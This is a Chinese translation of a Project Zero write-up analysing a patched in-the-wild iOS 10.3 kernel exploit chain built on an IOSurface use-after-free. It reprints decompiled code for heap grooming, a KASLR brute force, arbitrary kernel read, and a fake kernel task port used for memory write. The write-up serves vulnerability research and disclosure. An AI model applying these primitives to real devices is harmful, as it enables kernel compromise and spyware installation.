# 深入探索在野外发现的iOS漏洞利用链（二）

阅读量 **439131**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-09-10 10:30:54

 **x**

##### 译文声明

本文是翻译文章，文章原作者 googleprojectzero，文章来源：googleprojectzero.blogspot.com

原文地址：<https://googleprojectzero.blogspot.com/2019/08/in-wild-ios-exploit-chain-2.html>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t013ea5d7d4c6cd018b.jpg)

## 概述

本文所描述的漏洞利用，是我自2016年底以来一直在审计的一个已知漏洞类。导致该漏洞的原因将会在第3条漏洞利用链中再次看到，第三篇文章将在随后发布。

该漏洞利用链针对iOS 10.3 – 10.3.3有效。我独立发现了这一漏洞并将其报告给Apple，该漏洞在iOS 11.2中实现了修复。

这也同时表明，Project Zero研究的漏洞确实与在野外被利用的漏洞相重合。

## iOS漏洞利用链#2：IOSurface

我们首先对最早发现的漏洞利用链进行分析，这是以iOS 10.0.1-10.1.1为目标的漏洞，可能自2016年9月以来就已经出现。

攻击目标：iPhone 5s到iPhone 7，运行iOS版本10.3 – 10.3.3（在11.2版本中被修复）

支持版本包括：

iPhone6,1 (5s, N51AP)  
iPhone6,2 (5s, N53AP)  
iPhone7,1 (6 plus, N56AP)  
iPhone7,2 (6, N61AP)  
iPhone8,1 (6s, N71AP)  
iPhone8,2 (6s plus, N66AP)  
iPhone8,4 (SE, N69AP)  
iPhone9,1 (7, D10AP)  
iPhone9,2 (7 plus, D11AP)  
iPhone9,3 (7, D101AP)  
iPhone9,4 (7 plus, D111AP)

支持版本包括：

14E277 (10.3 – 2017年3月27日)  
14E304 (10.3.1 – 2017年4月3日)  
14F89 (10.3.2 – 2017年5月15日)  
14G60 (10.3.3 – 2017年7月19日) <iOS 10的最新版本>

第一个不存在漏洞的版本：11.0 – 2017年9月19日

该漏洞在iOS 11.2版本中才实现修复，但漏洞利用仅支持10.3-10.3.3（iOS 10的最新版本）。针对iOS
11，攻击者转移到了新的漏洞利用链上。

## 内核漏洞

在这里，使用的内核漏洞是CVE-2017-13861，与Project
Zero发现的漏洞#1417（async_wake）相同。我独立发现了这个漏洞，并在2017年10月30日向Apple报告。攻击者似乎在我发现之前就停止利用该漏洞，最早不受支持的版本是iOS
11，在2017年9月19日发布。该漏洞直到iOS 11.2（2017年12月2日发布）才得到修复。

iOS 11的发布破坏了该漏洞利用中的一种利用技术，具体来说，在iOS
11中删除了mach_zone_force_gc()内核MIG方法。目前还不清楚攻击者为什么要针对iOS
11系统使用一个全新的漏洞利用链（在删除方法后使用强制GC的新技巧），而没有更新这条利用链。

## 漏洞分析

我们在第一个利用链中看到可以通过IOConnectCallMethod函数调用IOKit外部方法。我们可以调用另一个函数：IOConnectCallAsyncMethod，它需要一个额外的mach端口和引用参数：

    
    
    kern_return_t
    IOConnectCallMethod(mach_port_t     connection, 
                        uint32_t        selector,
                        const uint64_t* input,
                        uint32_t        inputCnt,
                        const void*     inputStruct,
                        size_t          inputStructCnt,
                        uint64_t*       output,
                        uint32_t*       outputCnt,
                        void*           outputStruct,
                        size_t*         outputStructCnt);
    

对比下面的：

    
    
    kern_return_t
    IOConnectCallAsyncMethod(mach_port_t     connection,
                             uint32_t        selector,
                             mach_port_t     wake_port,
                             uint64_t*       reference,
                             uint32_t        referenceCnt,
                             const uint64_t* input,
                             uint32_t        inputCnt,
                             const void*     inputStruct,
                             size_t          inputStructCnt,
                             uint64_t*       output,
                             uint32_t*       outputCnt,
                             void*           outputStruct,
                             size_t*         outputStructCnt);
    

目的是允许驱动程序在操作完成时向所提供的mach端口发送通知消息，因此名称是“Async”(hronous)。

由于IOConnectCallAsyncMethod是一个MIG方法，因此wake_port参数的生命周期将受到MIG的mach端口生命周期规则的约束。

MIG接受wake_port的引用，并调用MIG方法的时效内，然后将调用IOKit驱动程序的匹配外部方法实现。外部方法的返回值将传递到MIG级别，其中适用以下规则：  
如果返回码非0，表示错误，MIG将丢弃它在wake_port上的引用。如果返回码为0，表示成功，则MIG不会丢弃它对wake_port所做的引用，这意味着引用被转移到外部方法。

漏洞在于，IOSurfaceRootUserClient外部方法17（s_set_surface_notify）将丢弃wake_port上的引用，如果客户端先前已注册具有相同引用值的端口，就会返回错误代码。当只有一个引用时，MIG会看到错误代码并在wake_port上丢弃第二个引用。这将导致引用计数与指向端口的指针数不同步，从而导致Use-After-Free。

同样，由于沙箱配置文件中的这一行，可以从MobileSafari渲染器沙箱内部直接访问它：

    
    
    (allow iokit-open
           (iokit-user-client-class "IOSurfaceRootUserClient")
    

## 设置

该漏洞利用还依赖于系统加载程序来解析符号。它使用与漏洞利用链#1相同的代码来终止当前任务中所有其它线程。然而，在继续之前，该漏洞利用首先尝试检测该设备是否已经被利用。它会读取kern.bootargs
sysctl变量，如果bootargs包含字符串“iop1”，则线程会进入到无限循环。在漏洞利用结束时，我们将看到他们使用构建的内核内存读/写原语将“iop1”字符串添加到bootargs。

它们使用相同的序列化NSDictionary技术来检查设备和内核版本的组合，获得必要的偏移量，并确定是否支持此设备。

## 漏洞利用

漏洞利用使用RLIMIT_NOFILE资源参数调用setrlimit，以将打开文件限制增加到0x2000。随后，创建0x800官大，保存读取和写入结束文件描述符。请注意，默认情况下，iOS对打开文件描述符的数量具有较低的限制，因此调用setrlimit。

至此，已经创建了一个IOSurfaceRootUserClient连接，并且目前只是用来触发漏洞，而不是用于存储属性对象。

随后，调用mach_zone_force_gc()，表明初始资源设置已完成，接下来将开始Heap Groom。

## 内核区域分配器垃圾收集

该漏洞引入了涉及mach_zone_force_gc主机端口方法的新技术。在第一个漏洞利用链中，我们看到使用了内核kalloc函数来分配内核堆内存。这里所指的“堆”是指“用于临时存储器的区域”，与传统意义上的堆数据结构无关。kalloc返回的内存实际上来自一个名为zalloc的区域分配器。

内核为内核区域分配器保留其虚拟地址空间的固定大小区域，并且定义了许多命名区域。然后，当区域基于动态存储器分配模式增长时，虚拟存储器区域被分成块。所有区域都返回固定大小的分配。

kalloc函数是许多通用固定大小区域的包装器，例如kalloc.512、kalloc.6144等等。Kalloc包装器函数选择适合所请求分配的最小kalloc.XXX大小，然后要求区域分配器从该区域返回新的分配。除了kalloc区域，许多内核子系统还定义了自己的专用区域。例如，代表mach端口的内核结构总是从它们自己的名为ipc.ports的区域中分配。这并不是一个安全缓解方式，但它的存在确实意味着攻击者必须采取一些额外的步骤来构建常规意义的Use-After-Free攻击。

![](https://p1.ssl.qhimg.com/t01e7d31605d63532c6.png)

随着时间的推移，zalloc区域会趋于碎片化。当内存接近不足时，区域分配器可以执行垃圾收集。这与Java语言中的垃圾收集无关，在这里的含义要简单得多：区域GC操作涉及查找由完全释放分配组成的区域块，将这些块从特定区域移除（例如kalloc.4096）并再次可用于所有区域。

在iOS
11之前，可以通过调用mach_zone_force_gc()主机端口MIG方法来强制执行区域垃圾收集。强制区域GC是一个非常有用的原语，因为它可以将一个区域中对象的漏洞利用转移到另一个区域的对象中。在我们后续研究的所有内核漏洞利用中，都会使用到这一技术。

我们回到漏洞利用，在这里分配了两组端口：

第一组：1200个端口

第二组：1024个端口

正如我们在第一个利用链中所看到的，将会使用mach消息的外部内存描述符进行Heap
Grooming。在这里，对函数本身进行了微小的改动，但原理保持不变，以制作受控大小的kalloc分配，其生命周期与特定的mach端口相关联。将调用send_kalloc_reserver：

    
    
      send_kalloc_reserver(v124, 4096, 0, 2560, 1);
    

该过程会向端口v124发送一个mach消息，其中包含2560个外联描述符，每个描述符都会导致kalloc.4096区域分配。内存的内容在这里并不重要，最初它们只是试图填充kalloc.4096区域中的任何剩余空间。

## 对端口的Groom

我们已经看到漏洞涉及到mach端口，因此希望尝试一些关于mach端口的Heap
Grooming，这也就是接下来漏洞利用要做的事情。它分配了四个更大的端口组，我将其命名为ports_3、ports_4、ports_5和ports_6。

在一个循环中，将为ports_3分配10240个端口，然后分配一个我们称之为target_port_1的单独mach端口。随后，在第二个循环中为ports_4分配另外5120个端口。

在该过程中，试图像下面这样强制堆布局，其中target_port_1位于ipc_ports区域块中，块中的所有其他端口都来自ports_3或ports_4。请注意，由于iOS
9.2中引入了区域空闲列表缓解，因此在target_port_1的前面和后面都可能存在来自ports_3和ports_4的端口：

![](https://p5.ssl.qhimg.com/t011a4f22cb91be1a9c.png)

然后，再次执行相同的Groom过程，现在使用ports_5，然后是target_port_2，然后是ports_6：

![](https://p3.ssl.qhimg.com/t014e695710313fb9ea.png)

在mach消息的外部端口描述符中，会向target_port_1发送发送权限。外联端口（例如外部存储区域）会一次又一次地出现，因此值得我们对其进行详细研究。

## Heap Grooming技术：外联端口

用于发送外部端口的mach消息中使用的描述符结构与用于发送外部内存的结构非常相似：

    
    
    typedef struct {
      void*                      address;
      boolean_t                  deallocate: 8;
      mach_msg_copy_options_t    copy: 8;
      mach_msg_type_name_t       disposition : 8;
      mach_msg_descriptor_type_t type : 8;
      mach_msg_size_t            count;
    } mach_msg_ool_ports_descriptor_t;
    

地址字段也是指向缓冲区的指针，但这次是一个计数字段，而不是一个大小字段，它指定缓冲区中包含的mach端口名称的数量。当内核处理这个描述符时（位于ipc_kmsg.c中的ipc_kmsg_copyin_ool_ports_descriptor函数），将查找外部端口缓冲区的每个名称，对底层ipc_port结构进行引用，并将该引用指针置于其中一个kalloc的内存缓冲区，反映了外部端口缓冲区的布局。由于用户空间的端口名称为32位，并且iOS内核为64位，因此kalloc内核缓冲区的大小将会是外部端口描述符大小的两倍（因此每个32位名称都将成为64位的指针）。

随后，调用外部方法17（s_set_surface_notify）一次，将target_port_1作为wake_port参数传递。

要理解引用计数错误意味着什么，我们必须匹配并了解其生命周期。要弄清楚这里发生了什么，我们需要遍历目标端口的所有指针，并找出哪里具有引用。下面的图表展示了此时指向target_port_1的三个引用保持指针：

![](https://p5.ssl.qhimg.com/t014d4de16fb53edf3e.png)

现在，有三个指向target_port_1的引用保持指针：

指针A是渲染器进程的mach端口名称表中的条目（task->itk_space->it_table）。

指针B位于当前正在传输的消息的外部端口缓冲区中。需要注意的是，漏洞利用程序将此消息发送到它拥有接收权限的端口，这意味着它仍然可以通过接收消息来接收此权限。

指针C由IOSurfaceRootUserClient持有。第一次调用s_set_surface_notify外部方法时没有错误产生，因为用户客户端会为期拥有的指针保存一个正确的引用。

## 触发漏洞

随后，使用相同参数再次调用外部方法17。如前所述，这将导致在target_port_1上丢弃额外的引用，这意味着仍然会有三个引用保持指针A、B和C，但target_port_1的io_references字段将为2。

随后，它们会销毁用户客户端，从而在target_port_1上丢弃它的引用。

这意味着指针C和一个引用已经消失，指针A、B以及引用计数为1。然后，攻击者采取如下操作。

首先，销毁ports_3中的所有端口：

![](https://p2.ssl.qhimg.com/t014ce39d27ba2ed3aa.png)

然后，销毁发送带有外部端口描述符的消息的端口。因为这也会销毁端口消息队列中排队的所有消息，将会销毁指针B并丢弃一个引用：

![](https://p1.ssl.qhimg.com/t016fd4e456cf0de594.png)

引用计数将从1变为0，这意味着target_port_1分配将被释放回ipc_ports区域。但仍然可以使用指针A，现在指向ipc_ports区域块中已经释放的分配。

最后，将会销毁ports_4，希望将包含target_port_1的整个块保留为空（但指针A仍可用作悬空的ipc_port指针）。

![](https://p0.ssl.qhimg.com/t0158dde094960a09fd.png)

此时，先前包含target_port_1的区域块应该完全是空的，并且调用mach_zone_force_gc()
MIG方法来回收页面，使它们可供所有区域重复使用。

需要注意的是，漏洞利用假设只有来自ports_3、target_port_1和ports_4的端口填充目标ipc_ports区域块。如果不是这种情况，例如由于另一个任务在漏洞尝试填充ports_3和ports_4时分配了一个端口，那么漏洞利用将会失败，因为块不会被mach_zone_force_gc()进行垃圾收集。因此，target_port_1将继续指向释放后的ipc_port，很有可能导致内存严重错误（Kernel
Panic）。

该漏洞利用现在尝试执行“区域转换”操作，目的是试图将悬空指针A指向的存储器改为不同的区域。具体而言，将指向kalloc.4096。这也就是为什么之前进行了大量的kalloc.4096分配的原因。

现在，将大量具有外部端口描述符的mach消息发送到在漏洞利用开始时分配的一些端口。

每个描述符都有512个端口名称，意味着内核将分配一个4096字节的缓冲区（512个端口*每个指针8字节），端口名称在MACH_PORT_NULL和target_port_2之间轮换，这样target_port_2的地址将与悬挂的ipc_port的ip_context字段重叠。

这是一种当前众所周知的技术，用于从外部端口描述符创建伪内核对象。

![](https://p4.ssl.qhimg.com/t01ec120784ab5b0b7c.png)

他们发送了大量描述符，希望其中一个能替换之前由target_port_1占用的内存。然后，尝试读取悬空target_port_1的上下文值（将使用指针A）。

    
    
    mach_port_get_context(mach_task_self(), port_to_test, &context_val);

这是有效的，因为mach_port_get_context的内核代码非常简单，它不对端口进行引用，只保持锁定，读取ip_context字段并返回。因此，即使使用从外部端口描述符构建的非常零散的替换对象，它也可以正常工作。

如果以前包含target_port_1的内存确实被其中一个外部端口描述符替换，那么mach_port_get_context读取的值将是指向target_port_2的指针，这意味着它们已经公开了target_pointer_2在内存中的位置。

在其余所有的漏洞利用链中，都需要在已知位置获得已知数据，目前就已经解决了这一问题。

## 冲洗并重复

现在，已经知道target_port_2在内存中的位置，可以第二次触发漏洞以获得第二个悬空端口指针，这次是target_port_2。

首先销毁替换器外部端口描述符被发送到的所有端口，这会导致它们全部被释放到kalloc.4096空闲列表中。然后，它们通过外部内存描述符快速生成12800
kalloc.4096分配，以确保target_port_1指向的内存不会被重用于不受控制的分配。

现在将执行与之前相同的操作，来获取指向target_port_2的悬空指针：在外联端口描述符中将其发送给自己，通过IOSurfaceRootUserClient外部方法17来触发漏洞，然后关闭用户客户端并销毁周围的端口（这次是ports_5和ports_6数组）。

然而，第二次他们使用不同的替换对象，现在将尝试使用外部内存描述符来替换，而不再是外部端口。

    
    
    char replacer_buf[4096] = {0};
    
    do {
      loop_iter = 0;
      for (int nn = 0; nn < 20; nn++) {
        build_replacer_ool_mem_region(replacer_buf,
                                      (loop_iter << 12) + (port_context_tag << 32));
        send_kalloc_reserver(second_ports[loop_iter++],
                             4096,
                             &replacer_buf[24],
                             1024, // 4MB each message
                             1);
      }
      mach_port_get_context(mach_task_self(),
                            second_target_port,
                            &raw_addr_of_second_target_port);
    } while(HIDWORD(raw_addr_of_second_target_port) != port_context_tag );
    
    
    void
    build_replacer_ool_mem_region(char* buf,
                                  uint64_t context_val)
    {
      offset = 0x90; // initial value is offset of ip_context field
      for (int i = 0; i < constant_based_on_memsize; i++) {
        *(uint64_t*)(buf + (offset & 0xfff)) = context_val + (offset & 0xFFF);
        offset += 0xA8; // sizeof(struct ipc_port);
      }
    }
    

他们试图在外联内存描述符中填充虚假的端口，并且只关注上下文字段。这次，将三个单独的值打包到伪上下文字段中：

0-11：替换器页面中这段上下文字段的偏移量

12-31：loop_iteration（索引到发送kalloc_replacer的端口的second_ports数组）

32-63：0x1122 – 检测是否为替换端口的魔术值

每次循环过程，它们都会产生20480个kalloc.4096分配，希望其中一个分配能替换之前包含target_port_2的内存。该过程中，通过mach_port_get_context()来读取target_port_2的上下文值，并检查较高的32位是否与0x1122魔术值匹配。

根据已经了解的上下文值，可以知道哪个second_ports发送了与target_port_2重叠的kalloc替换其消息。并且根据第12-31位，也知道了替换器端口的页面上的偏移量。  
他们释放了kalloc替换器被发送到的端口，这也将释放另外1023个kalloc.4096分配，这些分配之间不存在重叠情况。

还有另一个窗口，系统上的不同进程可以重新分配目标内存缓冲区，这将导致漏洞利用崩溃。

## 管道

现在，在一个循环中，他们将4095字节的缓冲区写入之前分配的0x800管道的写入端。管道代码将进行kalloc.4096的分配，以保存管道的内容。对于替换mach消息的外部内存缓冲区来说，似乎没有什么不同，但还存在一个根本上的区别：管道缓冲区是可变的。通过读取管道缓冲区的完整内容（清空管道）然后写回相同数量的替换字节（重新填充管道缓冲区），可以更改后备kalloc分配的内容，而不会将其释放并重新分配，这就像mach消息OOL内存缓冲区的情况一样。

有读者可能会问，与先OOL内存再管道相比，为什么不直接用管道替换？原因在于，管道支持缓冲区具有自己相对较低的分配大小限制（16MB），而传输中的OOL内存仅仅收到可用区域分配器内存的限制。随着攻击者在后期不断改进利用链，他们实际上逐步删除了中间的OOL步骤。

攻击者使用与以前相同的函数来构建将替换端口的管道缓冲区内容，但使用不同的标记魔术值，并将第12-31位设置为pipe_fd数组中管道的索引：

    
    
      replacer_pipe_index = 0;
      for (int i1 = 0; i1 < *n_pipes; i1++) {
        build_replacer_ool_mem_region(replacer_buf,
                                      (i1 << 12) + (port_context_tag << 33));
        write(pipe_fds[2 * i1 + 1], replacer_buf, 0xFFF);
      }
    

他们再次从第二个悬空端口通过mach_port_get_context读取ip_context值，并检查上下文是否与新的管道替换器上下文匹配。如果是，他们现在已经成功创建了一个虚假的ipc_port，对应着一个可变的管道缓冲区。

## 使用clock_sleep_trap击败KASLR

在Stefen
Esser讨论OOL端口描述符技术的幻灯片中，他还讨论了一种使用假mach端口强制使用KASLR的技术。这个技巧也被用于yalu102越狱之中。

下面是clock_sleep_trap的代码。在这里的mach相当于BSD系统调用。

    
    
    /*
     * Sleep on a clock. System trap. User-level libmach clock_sleep
     * interface call takes a mach_timespec_t sleep_time argument which it
     * converts to sleep_sec and sleep_nsec arguments which are then
     * passed to clock_sleep_trap.
     */
    kern_return_t
    clock_sleep_trap(
      struct clock_sleep_trap_args *args)
    {
      mach_port_name_t clock_name        = args->clock_name;
      sleep_type_t sleep_type            = args->sleep_type;
      int sleep_sec                      = args->sleep_sec;
      int sleep_nsec                     = args->sleep_nsec;
      mach_vm_address_t wakeup_time_addr = args->wakeup_time;  
      clock_t clock;
      mach_timespec_t swtime             = {};
      kern_return_t rvalue;
    
      /*
       * Convert the trap parameters.
       */
      if (clock_name == MACH_PORT_NULL)
        clock = &clock_list[SYSTEM_CLOCK];
      else
        clock = port_name_to_clock(clock_name);
    
      swtime.tv_sec  = sleep_sec;
      swtime.tv_nsec = sleep_nsec;
    
      /*
       * Call the actual clock_sleep routine.
       */
      rvalue = clock_sleep_internal(clock, sleep_type, &swtime);
    
      /*
       * Return current time as wakeup time.
       */
      if (rvalue != KERN_INVALID_ARGUMENT && rvalue != KERN_FAILURE) {
        copyout((char *)&swtime, wakeup_time_addr, sizeof(mach_timespec_t));
      }
      return (rvalue);
    }
    
    
    
     clock_t
    port_name_to_clock(mach_port_name_t clock_name)
    {
      clock_t     clock = CLOCK_NULL;
      ipc_space_t space;
      ipc_port_t port;
    
      if (clock_name == 0)
        return (clock);
      space = current_space();
      if (ipc_port_translate_send(space, clock_name, &port) != KERN_SUCCESS)
        return (clock);
      if (ip_active(port) && (ip_kotype(port) == IKOT_CLOCK))
        clock = (clock_t) port->ip_kobject;
      ip_unlock(port);
      return (clock);
    }
    
    
    
     static kern_return_t
    clock_sleep_internal(clock_t clock,
                         sleep_type_t sleep_type,
                         mach_timespec_t* sleep_time)
    {
      ...
      if (clock == CLOCK_NULL)
        return (KERN_INVALID_ARGUMENT);
    
      if (clock != &clock_list[SYSTEM_CLOCK])
        return (KERN_FAILURE);
      ...
    
    
    
    /*
     * List of clock devices.
     */
    SECURITY_READ_ONLY_LATE(struct clock) clock_list[] = {
    
      /* SYSTEM_CLOCK */
      { &sysclk_ops, 0, 0 },
    
      /* CALENDAR_CLOCK */
      { &calend_ops, 0, 0 }
    };
    

其工作原理是，将虚假端口的名称作为clock_name传递给trap。该名称将传递给port_name_to_clock，后者验证结构ipc_port的io_bit的KOTYPE字段是否为IKOT_CLOCK，然后返回ip_kobject字段，该字段是虚假端口中偏移量+0x68处的指针值。该指针作为clock_sleep_internal的第一个参数传递，并与&clock_list[SYSTEM_CLOCK]进行比较：

    
    
    if (clock != &clock_list[SYSTEM_CLOCK])
        return (KERN_FAILURE);
    

我们对上述技巧需要有两点深入了解：首先，clock_list数组驻留在内核DATA段中，并且与内核的其余部分一样，使用了相同的KASLR
Slide。其次，clock_sleep_trap返回KERN_FAILURE的唯一方法是上述比较过程结果不一致。其他的所有错误路径都会返回不同的错误代码。

我们将上述两点相组合，就可以暴力破解KASLR。对于该漏洞利用所面向的iOS版本，只有256个可能的KASLR
Slide。因此，通过创建一个虚假的IKOT_CLOCK端口并依次将clock_list数组中的system
clock的每个可能地址设置为ip_kobject字段，然后调用clock_sleep_trap mach
trap并观察返回值是否不是KERN_FAILURE，就可以确定出正确的那一个。

代码如下：

    
    
    int current_slide_index = 0;
    char buf[0x1000];
    while (current_slide_index < 256) {
      // empty the pipe
      read(pipe_fds[2 * replacer_pipe_index],
           buf,
           0x1000uLL);
    
      // build a fake clock port
      memset(buf, 0, 0x1000);
      char* fake_port = &buf[offset_of_second_port_on_page];
      *(uint32_t*)(fake_port+0x00) = 0x80000019;      // IO_ACTIVE | IKOT_CLOCK
      *(uint32_t*)(fake_port+0x08) = 10;              // io_refs
      // ip_kobject
      *(uint64_t*)(fake_port+0x68) = system_clock_kaddr_unslid + (current_slide_index << 21);
      *(uint32_t*)(fake_port+0xa0) = 10;              // msg count
    
      // refill the pipe
      write(pipe_bufs[(2 * replacer_pipe_index) + 1],
            buf,
            0xfff);
    
      if ( !(unsigned int)clock_sleep_trap(second_target_port, 0, 0, 0, 0)) {
        // found it!
        kernel_base = 0xfffffff007004000 + (current_slide_index << 21);
        break;
      }
    
      current_slide_index++;
    }
    

在iOS漏洞利用链#2、#3和#4中，使用了相同的技巧和代码。

## 内核读取和写入

在iOS漏洞利用链1中，我们涉及到了内核任务端口。一个端口，经过精心设计后，就可以授予对拥有发送权限的任何人的内核内存读写访问权限。利用内存损坏漏洞，攻击者能够获得对真实内核任务端口的发送权限，从而非常容易地获得修改内核内存的能力。

在iOS 10.3中，引入了一种缓解措施，旨在防止内核任务端口被任何用户空间进程使用。

在convert_port_to_task，会调用将任务端口转换为基础结构任务的指针，添加了以下代码：

    
    
      if (task == kernel_task && current_task() != kernel_task) {
        ip_unlock(port);
        return TASK_NULL;
      }
    

攻击者很容易绕过这种缓解方案。通过简单地在不同的内核地址上创建内核任务结构的副本，与kernel_task的指针比较结果将不一致，内核内存读写访问将持续工作。  
该绕过的先决条件是能够读取真实内核任务结构中足够多的字段，从而可以制作虚假的副本。为此，攻击者使用了pid_for_task技巧。在看到yalu102越狱中使用过这一技巧后，我首先使用了这一技巧，但与此同时Stefen
Esser声称至少从iOS 9开始就在他的iOS漏洞利用课程中教授这一技巧。

## pid_for_task

这个技巧的先决条件是能够制作虚假的ipc_port结构，并能将受控数据放在已知地址。在拥有这两个原语之后，便可以在任意受控地址读取32位值。

这一技巧是构建一个虚假的任务端口（KOTYPE=IKOT_TASK），但目标不是针对mach_vm_read/write方法使用的字段，而是pid_for_task
trap。针对iOS 10.3的trap代码如下：

    
    
    kern_return_t
    pid_for_task(struct pid_for_task_args *args)
    {
      mach_port_name_t t = args->t;
      user_addr_t pid_addr  = args->pid;  
      ...
      t1 = port_name_to_task(t);
      ...
      p = get_bsdtask_info(t1);
      if (p) {
        pid  = proc_pid(p);
      ...
      (void) copyout((char *) &pid, pid_addr, sizeof(int));
      ...
    }
    

port_name_to_task将验证KOTYPE字段是否为IKOT_TASK，然后返回ip_kobject字段。
get_bsdtask_info返回struct任务的bsd_info字段：

    
    
    void  *get_bsdtask_info(task_t t)
    {
    return(t->bsd_info);
    }
    

proc_pid返回结构proc的p_pid字段：

    
    
    int
    proc_pid(proc_t p)
    {
    if (p != NULL)
    return (p->p_pid);
      ...
    }
    

在该漏洞利用支持的所有iOS版本中，结构task的bsd_info字段都位于偏移量+0x360处，而所有结构proc的p_pid字段都位于偏移量+0x10处。

因此，通过将ip_kobject字段指向受控制的存储器，然后在偏移0x360处写入一个指针，该指针指向我们希望读取的32位值后面的0x10字节，可以构建一个虚假的任务端口，该端口在传递给pid_for_task
trap时，将返回从任意地址读取的32位值。

![](https://p5.ssl.qhimg.com/t01fe53649267cd5c12.png)

具体代码如下：

    
    
    uint32_t
    slow_kread_32(uint64_t kaddr,
                  mach_port_name_t dangling_port,
                  int *pipe_fds,
                  int offset_on_page_to_fake_port,
                  uint64_t pipe_buffer_kaddr):
    
    {
      char buf[0x1000] = {0};
    
      // empty pipe buffer
      read(pipe_fds[0],
           buf,
           0x1000);
    
      // build the fake task struct on the opposite side of the page
      // to the fake port
      if ( offset_on_page_to_fake_port < 1792 )
        offset_on_page_to_fake_task = 2048;
    
      // build the fake task port:
      char* fake_ipc_port = &buf[offset_on_page_to_fake_port];
      *(uint32_t*)(fake_ipc_port+0x00) = 0x80000002; // IO_ACTIVE | IKOT_PORT
      *(uint32_t*)(fake_port+0x08)     = 10; // io_refs
      // ip_kobject
      *(uint64_t*)(fake_port+0x68) = pipe_buffer_kaddr + offset_on_page_to_fake_task;
    
      char* fake_task = &buf[offset_on_page_to_fake_task];
      *((uint32_t*)(fake_task + 0x10)  = 10; // task refs
      *((uint64_t*)(fake_task + 0x360) = kaddr - 0x10; // 0x10 below target kaddr
    
      // refill pipe buffer
      write(pipe_fds[1],
            buf,
            0xfff);
    
      pid_t pid = 0;;
      pid_for_task(dangling_port, &pid);
      return (uint32_t)pid;
    }
    

该技术将在所有后续漏洞利用链中，用于初始bootstrap内核内存读取功能。

## 内核内存写入

首先，在内核映像的基础上读取了32位值。之所以能够这样做，是因为已经确定了KASLR
Slide，因此通过将其添加到未刷新的硬编码内核映像加载地址（0xfffffff007004000）就可以确定内核映像的运行时基址。然而，这一读取可能是在测试过程中发现的，因为对读取到的值无法做任何操作。

使用此设备的偏移量和内核版本，可以读取DATA段中指向kernel_task的指针的地址，然后读取整个任务结构：

    
    
      for (int i3 = 0; i3 < 0x180; i3++) {
        val = slow_kread_32(
                kernel_task_address_runtime + 4 * i3,
                second_target_port,
                &pipe_fds[2 * replacer_pipe_index],
                second_dangler_port_offset_on_page,
                page_base_of_second_target_port);
         *(_DWORD *)&fake_kernel_task[4 * i3] = val;
      }
    

在任务结构中，读取指针+0xe8，即itk_sself，这是一个指向真实内核任务端口的指针。然后，可以读取整个真实内核任务端口的内容：

    
    
      memset(fake_kernel_task_port, 0, 0x100);
      for ( i4 = 0; i4 < 64; ++i4 ) {
        v17 = slow_kread_32(
                kernel_task_port_address_runtime + 4 * i4,
                second_target_port,
                &pipe_fds[2 * replacer_pipe_index],
                second_dangler_port_offset_on_page,
                page_base_of_second_target_port);
        *(_DWORD *)&fake_kernel_task_port[4 * i4] = v17;
      }
    

他们对内核任务端口的副本进行了三处更改：

    
    
      // increase the reference count:
      *(_DWORD *)&fake_kernel_task_port[4] = 0x2000;
    
      // pointer the ip_kobject pointer in to the pipe buffer
      *(_QWORD *)&fake_kernel_task_port[0x68] = page_base_of_second_target_port + offset;
    
      // increase the sorights
      *(_DWORD *)&fake_kernel_task_port[0xA0] = 0x2000;
    

随后，将其复制到缓冲区中，缓冲区将被写入悬空端口偏移量处的管道：

    
    
      memset(replacer_page_contents, 0, 0x1000uLL);
      memcpy(&replacer_page_contents[second_dangler_port_offset_on_page],
             fake_kernel_task_port,
             0xA8);
    

对于不包含端口的一半页面，编写虚假的内存任务：

    
    
      memcpy(&replacer_page_contents[other_side_index], fake_kernel_task, 0x600);
    

![](https://p1.ssl.qhimg.com/t019b133c0fd3c0fad1.png)

该过程通过端口（管道缓冲区）实现写入，创建一个虚假内核任务端口，绕过了内核任务端口缓解。

本系列文章中的所有后续内核漏洞，都重复使用了这种技术。

## 后利用过程

获得了内核内存的读取/写入访问权限后，就像在iOS漏洞利用链#1中一样，通过查找launch的ucred来解除当前进程的取消分配。攻击者的代码有所改进，现在在派生出植入工具后会恢复当前进程的原始ucred。

攻击者必须修补平台策略字节码，并将植入工具的哈希值添加到信任缓存之中。

在后利用阶段，与利用链#1的主要差异在于攻击者现在将设备标记为已被成功利用。攻击者希望在内核漏洞利用过程中尽早检查是否存在这一标记，如果存在则立即退出。

具体来说，攻击者会覆盖iBoot传递给引导XNU内核的引导参数。可以从MobileSafari渲染器沙箱中读取此字符串。他们将字符串“iopl”添加到bootargs，并在内核漏洞利用的一开始读取bootargs并检查是否存在此字符串。如果找到，则证明这台设备已经被攻陷，他们不需要再继续进行漏洞利用。

在posix_spawn之后，植入二进制文件会等待1/10秒，重置其ucreds，将它们的发送权限放在虚假核心任务端口，ping启动植入工具的服务器并进入持续休眠的状态。

本文翻译自googleprojectzero.blogspot.com
[原文链接](https://googleprojectzero.blogspot.com/2019/08/in-wild-ios-exploit-chain-2.html)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **P!chu** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/186093](/post/id/186093)

安全客 - 有思想的安全新媒体

本文转载自:
[googleprojectzero.blogspot.com](https://googleprojectzero.blogspot.com/2019/08/in-wild-ios-exploit-chain-2.html)

如若转载,请注明出处： <https://googleprojectzero.blogspot.com/2019/08/in-wild-ios-exploit-chain-2.html>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [iOS](/tag/iOS)
  * [漏洞利用](/tag/漏洞利用)
  * [移动安全](/tag/移动安全)
  * [0day](/tag/0day)

 **+1** __1赞

 __收藏

![](https://p3.ssl.qhimg.com/t01bd1dba67fe13cdc6.png) P!chu

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

